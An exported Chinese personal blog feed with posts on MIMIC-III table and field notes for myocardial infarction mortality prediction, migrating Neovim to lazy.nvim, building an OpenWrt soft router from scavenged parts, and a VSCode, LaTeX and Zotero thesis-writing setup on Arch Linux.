<h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><p>这个，急性心肌梗死这个直接看心电图或者彩超啥的更好一些，准确率一般不会低于90%。心血管疾病这种做这个预测基本没有太大意义。急性肾衰竭啥的可能更有意义一点</p>
<p>MIMIC数据库里面的数据亚裔很少，放到国内可能不太合适。护理和临床记录方式也差别不小。</p>
<p>这是2001-2012年的数据，近十年来医学水平提高了不少，包括再灌注等手段，死亡率已经下降了，用这批数据预测现在的可能会偏高</p>
<h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><h3 id="MIMIC数据库表格名称及用途"><a href="#MIMIC数据库表格名称及用途" class="headerlink" title="MIMIC数据库表格名称及用途"></a>MIMIC数据库表格名称及用途</h3><table>
<thead>
<tr>
<th>表格名称</th>
<th>表格内容</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>ADMISSIONS（入院表）</td>
<td>提供有关患者的入院信息，由于为病人进行的每次唯一的医院访问都分配了一个唯一的信息<code>HADM_ID</code>，因此ADMISSIONS表可以被认为是<code>HADM_ID</code></td>
<td></td>
</tr>
<tr>
<td>CALLOUT(标注表)</td>
<td>提供患者何时准备好从ICU出院以及患者何时实际从ICU出院的信息</td>
<td></td>
</tr>
<tr>
<td>caregivers</td>
<td>记录医护人员信息（ID、类型、附加信息）</td>
<td></td>
</tr>
<tr>
<td>chartevents</td>
<td>记录所有病人的图表数据，住院期间的所有症状、体征、精神状态、实验室检查等</td>
<td></td>
</tr>
<tr>
<td>cptevents</td>
<td>包含当前的程序术语（CPT）代码，这些代码便于为在患者身上执行的操作计费。</td>
<td></td>
</tr>
<tr>
<td>d_cpt</td>
<td>当前程序术语（CPT）代码的高级定义</td>
<td></td>
</tr>
<tr>
<td>prescriptions（处方）</td>
<td>包含药物相关的订单条目，即处方</td>
<td></td>
</tr>
<tr>
<td>inputevents_cv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源CareVue ICU数据库。</td>
</tr>
<tr>
<td>inputeevents_mv</td>
<td>患者输入数据（流入患者体内液体信息）</td>
<td>表格来源Metavision ICU数据库。</td>
</tr>
<tr>
<td>outputevent</td>
<td>患者的输出数据。</td>
<td></td>
</tr>
<tr>
<td>labevents</td>
<td>包含给定患者的所有实验室测量值，包括患者数据（ITEMID、VALUE）</td>
<td></td>
</tr>
<tr>
<td>d_icd_diagnoses</td>
<td>ICD-9疾病诊断的定义表,对 疾病编码的解释</td>
<td></td>
</tr>
<tr>
<td>d_icd_procedures</td>
<td>ICD-9治疗程序代码的解释</td>
<td></td>
</tr>
<tr>
<td>d_items</td>
<td>ICU数据库中所有项目的定义表</td>
<td></td>
</tr>
<tr>
<td>d_labitems</td>
<td>所有实验室测量的定义表（对ITEMID的解释，对应数据类型，关联的LOINC代码）</td>
<td></td>
</tr>
<tr>
<td>datetimeevents</td>
<td>包含所有日期格式的数据</td>
<td></td>
</tr>
<tr>
<td>diagnoses_icd（诊断表）</td>
<td>包含患者住院期间所有ICD-9诊断</td>
<td></td>
</tr>
<tr>
<td>drgcodes</td>
<td>包含患者的诊断相关组（DRG）代码</td>
<td></td>
</tr>
<tr>
<td>icustays</td>
<td>患者在ICU内的住院概要（入住或者转出ICU的时间等）</td>
<td></td>
</tr>
<tr>
<td>microbiologyevents</td>
<td>包含微生物学信息，包括进行的测试和敏感性</td>
<td></td>
</tr>
<tr>
<td>noteevents</td>
<td>包含所有患者注意事项。，主要是不便于数字化的报告</td>
<td></td>
</tr>
<tr>
<td>patients</td>
<td>包含患者的基本信息（性别、出生日期、死亡日期、死亡标志位）</td>
<td></td>
</tr>
<tr>
<td>procedureevents_mv</td>
<td>包含患者的（治疗）程序</td>
<td></td>
</tr>
<tr>
<td>procedures_icd</td>
<td>包含患者的ICD程序，最值得注意的是ICD-9程序，即诊断程序</td>
<td></td>
</tr>
<tr>
<td>services</td>
<td>患者被接纳&#x2F;转移的服务</td>
<td></td>
</tr>
<tr>
<td>transfers</td>
<td>患者整个住院期间的物理位置</td>
<td></td>
</tr>
</tbody></table>
<p>注意： 表格主要分为两种，一种是以D开头的，表示该表格为字典，比如d_labitems，表示实验室检查字典，内含每个实验室检查结果的说明；没有以D打头的表格则是记录患者信息的表格，比如labevents则表示患者住院期间的所有实验室检查结果。</p>
<h3 id="MIMIC数据表中主要字段"><a href="#MIMIC数据表中主要字段" class="headerlink" title="MIMIC数据表中主要字段"></a>MIMIC数据表中主要字段</h3><table>
<thead>
<tr>
<th>数据表</th>
<th>字段</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>ADMISSION</td>
<td>SUBJECT_ID</td>
<td>每个患者的唯一标识</td>
</tr>
<tr>
<td>ADMISSION</td>
<td>HADM_ID</td>
<td>患者每次入院的唯一标识</td>
</tr>
<tr>
<td>ADMISSION</td>
<td>ADMITTIME</td>
<td>入院时间</td>
</tr>
<tr>
<td>ADMISSION</td>
<td>DEATHTIME</td>
<td>死亡时间</td>
</tr>
<tr>
<td>DIAGNOSES_ICD</td>
<td>ICD9_CODES</td>
<td>患者的ICD-9编码</td>
</tr>
<tr>
<td>ADMISSION</td>
<td>HOSPITAL_EXPIRE_FLAG</td>
<td>是否死亡</td>
</tr>
<tr>
<td>D_ITEMS</td>
<td>ITEMID</td>
<td>项目编号</td>
</tr>
<tr>
<td>D_ITEMS</td>
<td>LEABEL</td>
<td>项目名称</td>
</tr>
<tr>
<td>ICUSTAYS</td>
<td>ICUSTAY_ID</td>
<td>每次ICU病房接受病人唯一标识</td>
</tr>
<tr>
<td>LABEVENTS</td>
<td>VALUE</td>
<td>检查项目</td>
</tr>
<tr>
<td>LABEVENTS</td>
<td>VALUEUOM</td>
<td>ITEM的值 检查项目的单位（如K&#x2F;uL）</td>
</tr>
<tr>
<td>LABEVENT</td>
<td>FLAG</td>
<td>检查项目是否异常（正常为Null）</td>
</tr>
</tbody></table>
<h3 id="急性心肌梗死患者主要特征"><a href="#急性心肌梗死患者主要特征" class="headerlink" title="急性心肌梗死患者主要特征"></a>急性心肌梗死患者主要特征</h3><table>
<thead>
<tr>
<th>特征</th>
<th>字段或ITEMID</th>
</tr>
</thead>
<tbody><tr>
<td>年龄</td>
<td>PTENETS.DOD和DOB</td>
</tr>
<tr>
<td>性别</td>
<td>PATIENTS.GENDER</td>
</tr>
<tr>
<td>心率</td>
<td>CHARTEVENTS.ITEMID</td>
</tr>
<tr>
<td>入院类型</td>
<td>ADMISSION_TYPE</td>
</tr>
<tr>
<td>ICD细分编码</td>
<td>ADMISSION.ICD9_CODE</td>
</tr>
<tr>
<td>最小GCS评分</td>
<td>220739、223901、223900、198</td>
</tr>
<tr>
<td>排尿量</td>
<td>40055、226559</td>
</tr>
<tr>
<td>PaO2</td>
<td>779、220224</td>
</tr>
<tr>
<td>白细胞计数WBC</td>
<td>220546、15424、200、1127、861</td>
</tr>
<tr>
<td>体温</td>
<td>676、223762、678、223761</td>
</tr>
<tr>
<td>血钾浓度</td>
<td>50971</td>
</tr>
<tr>
<td>血钠浓度</td>
<td>50983</td>
</tr>
<tr>
<td>血胆红素浓度</td>
<td>50885</td>
</tr>
<tr>
<td>是否有血液恶性肿瘤</td>
<td>ICD9_CODE &#x3D;200XX-208XX</td>
</tr>
<tr>
<td>收缩压</td>
<td>51、220050</td>
</tr>
<tr>
<td>动脉收缩压</td>
<td>455、220179</td>
</tr>
<tr>
<td>血清尿素水平</td>
<td>51006</td>
</tr>
</tbody></table>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>MIMIC IIII  数据库中用于识别患者身份的字段共有3个：subjects_id，hadm_id和icustay_id。其中subjects_id是患者身份的唯一标识，即一个subject_id只对应一名患者，一名患者也只有一个subject_id。hadm_id是患者每次住院的身份识别号，一个患者可能多次住院，因此一个subjects_id会对应多个hadm_id，但一个hadm_id只能对应一个subject_id。icustay_id表示患者在进入ICU的编号，因为患者一次住院可以多次进入不同的ICU，因此一个icustay_id只能对应一个hadm_id，当然也只能对应一个subject_id，但一个hadm_id可以对应多个icustay_id。在利用 MIMIC III 数据库进行研究时，往往需要运用sql语言对多个数据库进行连接，连接的基础一般就是这三个字段。</li>
<li>患者的临床资料不一定是住ICU期间的临床资料，也可能是住普通病房时的资料。记录患者入院时间的表格为admission，内含三个时间点：admittime，表示患者入院时间；dischartime，表示患者出院时间；deathtime，表示患者院内死亡的时间。如果deathtime为空(null)，则表示患者住院期间未死亡。记录患者进入和离开ICU的表格为icustays，这个表格中有两个时间较为重要，分别是intime和outtime，前者表示进入ICU的时间，后者表示离开ICU的时间。当然，如果患者在ICU死亡，那么dischartime、outtime和deathtime理论上就是同一个时间，但实际上会稍微有些出入，估计是由于录入不及时造成的；</li>
<li>MIMIC III  中的数据来自于两套数据采集系统：carevue和metavision。在icustays表格中，有一个字段叫dbsource，用于标识数据是来源于carevue还是metavision。CareVue记录的是2001至2008年入院的患者资料，Metavision则是2008至2012年期间入院的患者资料。在Metavision中，病人的随访时间最少为90天，在CareVue中，病人的随访时间则至少为4年。换而言之，在进行预后研究时，如果将数据来源限定为CareVue，则可以将随访时间假定为4年，对于4年以后死亡的患者，可以将其在出院后第4年生存状况定义为“存活”。当然，如果患者的死亡状况(DOD_SSN)为空格(null)，也同样可以表明患者在出院后4年仍然存活。</li>
<li>MIMIC数据库中的ICD编码统计方式和国内不太一样，基本都包含并发症，比如一个病人流感入院并死亡，同时患有急性心肌梗死的并发症，那么该病人也算作急性心肌梗死患者。（主要诊断是其他的疾病，但同时患有某疾病并发症，也认为是该疾病患者，统计死亡时也算在里面）</li>
<li>在MIMIC中有一个’ADMISSION_TYPE，其中有3个类别，分别是URGENT，EMERGENCY和ELECTIVE，ELECTIVE是不紧急的，URGENT和EMERGENCY的区别大概是URGENT的紧急程度更高（一般是需要立即采取措施的那种）</li>
</ul>
]]></content>
      <tags>
        <tag>MIMIC</tag>
      </tags>
  </entry>
  <entry>
    <title>迁移到Neovim的新插件管理器lazy.nvim</title>
    <url>/neovim-lazy/</url>
    <content><![CDATA[<p>很久没写博客了，工作安定下来终于可以继续摸鱼了。</p>
<span id="more"></span>

<p>Neovim这些插件的半衰期太短了，几个月不折腾就跟不上了。刚用Neovim的时候就听说过很火的Packer.nvim插件管理器，当时Neovim可以用vim的vim-plug当插件管理器，就一直懒得往packer迁移，一直拖到现在，结果我还没迁移packer就已经凉了，emmmm</p>
<h2 id="lazy-nvim安装"><a href="#lazy-nvim安装" class="headerlink" title="lazy.nvim安装"></a>lazy.nvim安装</h2><p>AURe有一个包，我没用，照着github上的官方文档</p>
<p>在<code>~/.config/nvim/init.lua</code>或者<code>~/.config/nvim/init.lua</code>中添加</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 指定插件位置，不存在则clone到本地</span></span><br><span class="line"><span class="keyword">local</span> lazypath = vim.fn.stdpath(<span class="string">&quot;data&quot;</span>) .. <span class="string">&quot;/lazy/lazy.nvim&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> vim.loop.fs_stat(lazypath) <span class="keyword">then</span></span><br><span class="line">  vim.fn.system(&#123;</span><br><span class="line">    <span class="string">&quot;git&quot;</span>,</span><br><span class="line">    <span class="string">&quot;clone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;--filter=blob:none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https://github.com/folke/lazy.nvim.git&quot;</span>,</span><br><span class="line">    <span class="string">&quot;--branch=stable&quot;</span>, <span class="comment">-- latest stable release</span></span><br><span class="line">    lazypath,</span><br><span class="line">  &#125;)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">vim.opt.rtp:prepend(lazypath)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 照例require一下，如果同时使用vim-plug插件，记得把这个放在vim-plug后面</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;lazy&quot;</span>).setup(plugins, opts)</span><br></pre></td></tr></table></figure>

<p>然后打开nvim，在normal mode下<code>:checkhealth lazy</code>，能看到3个ok就行了</p>
<p>推荐将插件配置扔到单独的一个lua文件，将上面的require改为</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;lazy&quot;</span>).setup(<span class="string">&quot;plugins&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后添加插件，在<code>~/.config/nvim/lua/plugins.lua</code>中或者<code>~/.config/nvim/lua/plugins/*lua</code>中，比如im-select插件：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="string">&quot;keaising/im-select.nvim&quot;</span>,</span><br><span class="line">    <span class="built_in">config</span> = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&quot;im_select&quot;</span>).setup(&#123;&#125;)</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后启动nvim，按照提示按i安装就行了。</p>
<p>之前从vim迁到neovim的时候，用的coc.nvim。今年coc的作者已经不怎么更新了，曾经在知乎和推上很活跃的作者也不怎么网上冲浪了（记得曾经是位emacs铁粉，ghhn网上热情极高）。</p>
<p>用了Neovim默认的lsp, 然后加了个美化插件，功能依然不如coc.nvim。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="string">&quot;neovim/nvim-lspconfig&quot;</span>,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="string">&#x27;nvimdev/lspsaga.nvim&#x27;</span>,</span><br><span class="line">    <span class="built_in">config</span> = <span class="function"><span class="keyword">function</span><span class="params">()</span></span></span><br><span class="line">        <span class="built_in">require</span>(<span class="string">&#x27;lspsaga&#x27;</span>).setup(&#123;&#125;)</span><br><span class="line">    <span class="keyword">end</span>,</span><br><span class="line">    dependencies = &#123;</span><br><span class="line">        <span class="string">&#x27;nvim-treesitter/nvim-treesitter&#x27;</span>, <span class="comment">-- optional</span></span><br><span class="line">        <span class="string">&#x27;nvim-tree/nvim-web-devicons&#x27;</span>     <span class="comment">-- optional</span></span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvbGtlL2xhenkubnZpbQ==">https://github.com/folke/lazy.nvim<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>neovim</tag>
        <tag>lazy</tag>
      </tags>
  </entry>
  <entry>
    <title>垃圾佬的Openwrt软路由</title>
    <url>/openwrt/</url>
    <content><![CDATA[<p>又是捡垃圾的快乐一天</p>
<span id="more"></span>

<h3 id="教研室捡来的垃圾"><a href="#教研室捡来的垃圾" class="headerlink" title="教研室捡来的垃圾"></a>教研室捡来的垃圾</h3><blockquote>
<p>又不是不能用</p>
</blockquote>
<ul>
<li>2GB 内存条（看起来全新实际上至少八九年前的了，别问为什么只有2G，这是教研室能捡垃圾捡到的最后一块内存条了）</li>
<li>120G intel固态（包浆成色，上个月刚从一个旧电脑上拆下来的）</li>
<li>一块 i5 4570 的CPU（战斗成色，貌似也六年了）</li>
<li>一个风扇（战损成色，全是灰）</li>
<li>六七年前的华硕主板（伊拉克战损成色）</li>
<li>一个三星显示器（屏幕漏光，也有五六年了，装系统临时用一下）</li>
<li>一个2014年的老机箱（战斗成色，全是灰）</li>
<li>一个主机电源（不是很新，200W）</li>
<li>VGA线、电源线、排线（普通成色）</li>
<li>螺丝等（一大把旧主机上拆下来的）</li>
<li>键盘（N年前的薄膜，伊拉克战损成色，全是灰）</li>
</ul>
<p>对，102网吧的主板就是这样子的战损主板</p>
<p><img src="/openwrt/image-20201030191635951.webp" alt="对，只有这种主板了"></p>
<h3 id="全新的和自掏腰包的"><a href="#全新的和自掏腰包的" class="headerlink" title="全新的和自掏腰包的"></a>全新的和自掏腰包的</h3><p>基本都是室友出的钱</p>
<ul>
<li>螺丝刀等（全新，室友的）</li>
<li>一个插排（昨天室友买的）</li>
<li>硅脂（全新）</li>
<li>网卡（室友网购的，刚到）</li>
<li>网线（教研室网线太老了，就不捡垃圾了）</li>
<li>clash和v2ray订阅，机场买的</li>
</ul>
<h3 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h3><p>自行编译时间太长就用人家编译好的了, 室友刷的。本来以为可能2G的老内存可能会卡，结果室友的win10 pe上去意外的流畅。</p>
<p>借用了这个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0xvbW90SG8vVUVTVEMtTmV0d29ya0F1dG9Db25uZWN0">电子科技大学校园网自动登陆脚本<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="一点小插曲"><a href="#一点小插曲" class="headerlink" title="一点小插曲"></a>一点小插曲</h3><p>晚上室友买完插排，第二天我发现教研室的一个旧箱子里满满一箱子插排，好家伙，亏了一个亿。</p>
<p><img src="/openwrt/image-20201030191838215.webp" alt="这么多插排...."></p>
<p>本来Openclash都整好了，结果发现室友的安卓电报没法自行分流。换成了 ssr plus</p>
<p>装好之后发现风扇声音有点大……..直接把风扇线拔了，世界终于清净了。至于散热，问题不大（这么点负载总不可能把CPU给烧了），于是SSH上去把风扇关了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fanspeedctl stop --all --now</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>openwrt</tag>
        <tag>捡垃圾</tag>
      </tags>
  </entry>
  <entry>
    <title>Archlinux下VSCode+Latex+Zotero的论文写作方案</title>
    <url>/paper-with-latex-zotero-vscode/</url>
    <content><![CDATA[<p>开源拖拉机将就着用吧，又不是不能用，再见Word、EndNote和Windows。顺便说一下你电的LaTeX模板怎么用。不定期更新到毕业。</p>
<span id="more"></span>

<p>又遇到了Lamport老爷子的东西，上一次看到Lamport<del>还是上次</del>还是看Paxos算法的时候。</p>
<p>Office很强，但是微软不给Linux开发桌面版（好吧，我有在线的教育版，在线版写写文档还行，但是排版有一些捉襟见肘）。好吧，虚拟机或者wine是可以的但是我不想用。wps的Linux版倒是很不错，但是调格式放到office上又乱了，对数学公式的支持也不是特别好。<br>另一个让我放弃word和wps的重要原因是我想要用git做版本控制，手动命名一个个v0.0.8、v0.2.1版本的论文初稿实在是太蠢了。<br>最近放弃WPS的原因是新版本实在太糊了，我在Archlinux上试图降级旧版又失败了。本来以为新版WPS字体模糊是因为没有配适4k分辨率的屏幕，这个文章<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zOTU5OTM1NzY=">WPS For Linux个人版更新（Qt5版本）<i class="fa fa-external-link-alt"></i></span>的评论去也确实是这么说的。结果我打开1080p的笔记本，发现字体更糊了。<br>overleaf应该是我用过最好用的Latex在线编辑，但是我对在线的东西不是很信得过。TexStudio又不是太好看，高分屏下还比较糊，键位也不习惯，放弃了。lyx是很好用，但是我不太喜欢所见即所得，还是习惯左边源码右边编辑结果pdf这种。  </p>
<p>最终又回到了VSCode，目前的方案是ArchLinux下Zotero+textlive+VSCode（LaTeX Workshop插件）</p>
<h2 id="安装texlive"><a href="#安装texlive" class="headerlink" title="安装texlive"></a>安装texlive</h2><p>我用对中文支持比较好的xelatex，在Arch下我们装texlive的包就可以了。pdflatex也包含在里面，但是这个对中文支持没有那么好，一般用xelatex生成中文pdf。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S texlive-core texlive-langchinese  texlive-fontsextra</span><br></pre></td></tr></table></figure>

<p>texlive的不少宏包在Arch上都有系统的包，你可以用<code>yay</code>等AUR helper装，如果想用<code>tlmgr</code>装，那就用<span class="exturl" data-url="aHR0cHM6Ly9hdXIuYXJjaGxpbnV4Lm9yZy9wYWNrYWdlcy90bGxvY2FsbWdyLWdpdC8=">tllocalmgr-git<i class="fa fa-external-link-alt"></i></span>这个AUR包。</p>
<h2 id="Zotero配置"><a href="#Zotero配置" class="headerlink" title="Zotero配置"></a>Zotero配置</h2><h3 id="参考文献抓取和管理"><a href="#参考文献抓取和管理" class="headerlink" title="参考文献抓取和管理"></a>参考文献抓取和管理</h3><p>首先是中文论文网站引用和pdf抓取的问题，可以用下面这个插件：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2wwbzAvdHJhbnNsYXRvcnNfQ04=">Zotero translators 中文维护小组<i class="fa fa-external-link-alt"></i></span></p>
<p>知网文献可以用这个插件：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2wwbzAvamFzbWludW0=">jasminum<i class="fa fa-external-link-alt"></i></span></p>
<p>下载并放到translater文件夹中(Linux下默认应该是<code>~/Zotero/translators</code>)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/l0o0/translators_CN.git </span><br><span class="line"><span class="built_in">cp</span> -r translators_CN/translators/* ~/Zotero/translators</span><br></pre></td></tr></table></figure>

<p>参照README更新插件的translater就行了。</p>
<p>VSCode有一个Zotero LaTeX插件，可以用快捷键直接插入文献。安装后报错<code>Error adding citation: HTTPError: Response code 404 (Not Found)</code>，见<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21ibG9kZS92c2NvZGUtem90ZXJvL2lzc3Vlcy8y">Zotero Citations: could not connect to<i class="fa fa-external-link-alt"></i></span>。安装beta版本后成功解决。<code>yay -S zotero-beta</code></p>
<p>使用这个插件需要安装zotero插件<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JldG9ycXVlcmUvem90ZXJvLWJldHRlci1iaWJ0ZXg=">zotero-better-bibtex<i class="fa fa-external-link-alt"></i></span></p>
<p>具体使用请参考：<span class="exturl" data-url="aHR0cDovL3h1Z2VlLmNvbS9pbWFnZXMvMy8zYS9WU2NvZGUlRTQlQkQlQkYlRTclOTQlQTglRTglQUYlQjQlRTYlOTglOEUucGRm">VScode使用说明(Zotero插件) 刘再华<i class="fa fa-external-link-alt"></i></span></p>
<p>安装好之后按<code>Alt+z</code>就可以方便的插入参考文献了。</p>
<p>然后要插入GB&#x2F;T 7714格式化的参考文献，可以参考<span class="exturl" data-url="aHR0cHM6Ly9jdGFuLm1hdGguaWxsaW5vaXMuZWR1L21hY3Jvcy9sYXRleC9jb250cmliL2JpYmxhdGV4LWNvbnRyaWIvYmlibGF0ZXgtZ2I3NzE0LTIwMTUvYmlibGF0ZXgtZ2I3NzE0LTIwMTUucGRm">符合 GB&#x2F;T 7714-2015 标准的 biblatex 参考文献样式<i class="fa fa-external-link-alt"></i></span></p>
<p>有模板可以直接套模板，模板应该会处理参考文献格式。没有特殊喜好可以用 等支持GB&#x2F;T格式的模板。</p>
<p>ps：如果单纯为了插入GB&#x2F;T格式的参考文献可以用一点脏办法: <span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDE4MDU3MDQ=">电子科技大学LaTeX模板参考文献问题解决<i class="fa fa-external-link-alt"></i></span> (不得已的办法)</p>
<h3 id="自建同步"><a href="#自建同步" class="headerlink" title="自建同步"></a>自建同步</h3><p>Zotero的文件同步免费的只有300M，而且很慢。</p>
<p>我们可以自建文件同步，只要支持WebDAV协议就行了。这个好办，Nginx就能做到。</p>
<h2 id="VSCode配置"><a href="#VSCode配置" class="headerlink" title="VSCode配置"></a>VSCode配置</h2><h3 id="LaTex插件选择"><a href="#LaTex插件选择" class="headerlink" title="LaTex插件选择"></a>LaTex插件选择</h3><p>通常推荐装Latex Workshop这个插件。配置可以参考<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0phbWVzLVl1L0xhVGVYLVdvcmtzaG9wL3dpa2k=">官方文档<i class="fa fa-external-link-alt"></i></span>, wiki写的很全。功能当然没有TeXStudio全，但是已经满足我的日常需求了（一般只装这一个插件就够了）</p>
<p>另一个插件叫LaTeX。LaTeX Workshop功能比LaTeX插件多一点，如果只想把VSCode当一个普通的文本编辑器不想要额外的snippet等功能的话，装LaTeX这个插件就可以了。</p>
<h4 id="编译配置"><a href="#编译配置" class="headerlink" title="编译配置"></a>编译配置</h4><p>编译配置推荐使用<code>latexmk</code>的方案，可以省去xelatex-bibtex-xelatex*2的多次编译。  </p>
<p>比如你电的毕业论文模板，完整的编译需要</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xelatex main.tex</span><br><span class="line">bibtex main.aux</span><br><span class="line">bibtex accomplish.aux</span><br><span class="line">xelatex main.tex</span><br><span class="line">xelatex main.tex</span><br></pre></td></tr></table></figure>

<p>编译的时候需要先latexmk编译一遍，再bibtex编译一遍，再latexmk编译一遍，见<a href="https://liam.page/2016/01/23/using-bibtex-to-generate-reference/"></a></p>
<p>或者参考这篇文章：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMjk5MzgwMDc=">我们该如何优雅地使用LaTeX in 2020<i class="fa fa-external-link-alt"></i></span></p>
<p>编辑<code>settings.json</code>, 加上能够编译参考文献的配置，就可以在左侧边栏点击运行了。（其实我还是喜欢在命令行里<code>alias</code>将这三个命令指定一个短命令）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;latex-workshop.latex.recipes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;xelatex -&gt; bibtex -&gt; xelatex*2&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tools&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;xelatex&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;bibtex&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;xelatex&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;xelatex&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>

<p><strong>这样需要编译四次，有一个更好的方法是<code>latexmk</code>增量编译</strong></p>
<p>我们将<code>settings.json</code><strong>改成这个样子</strong>（方案来自<span class="exturl" data-url="aHR0cHM6Ly9saWFtLnBhZ2UvMjAyMC8wNC8yNC91c2luZy1MYVRlWG1rLXdpdGgtTGFUZVh3b3Jrc2hvcC13aXRoLVZTQ29kZS8=">在 VSCode 的 LaTeXworkshop 插件中使用 LaTeXmk<i class="fa fa-external-link-alt"></i></span>）</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;latex-workshop.latex.tools&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LaTeXmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;latexmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;-xelatex&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-synctex=1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-shell-escape&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-interaction=nonstopmode&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-file-line-error&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;%DOC%&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="string">&quot;-outdir=%OUTDIR%&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;latex-workshop.latex.recipes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LaTeXmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tools&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;XeLaTeXmk&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>这样只需要<code>latexmk</code>一个编译命令，<code>latexmk</code>的增量编译也比原来快了。</p>
<h3 id="其他功能"><a href="#其他功能" class="headerlink" title="其他功能"></a>其他功能</h3><p>LaTeX Workshop 左侧边栏可以查看字数统计<br>可以自定义snippest快捷命令<br>可以插入参考文献（需要手打&#96;\cite{}，支持搜索bib文件里的文献（可以用zotero导出并开启同步））, 这样就不用装zotero latex插件了。</p>
<h3 id="json配置"><a href="#json配置" class="headerlink" title="json配置"></a>json配置</h3><p>这是我的<code>settings.json</code>配置：</p>
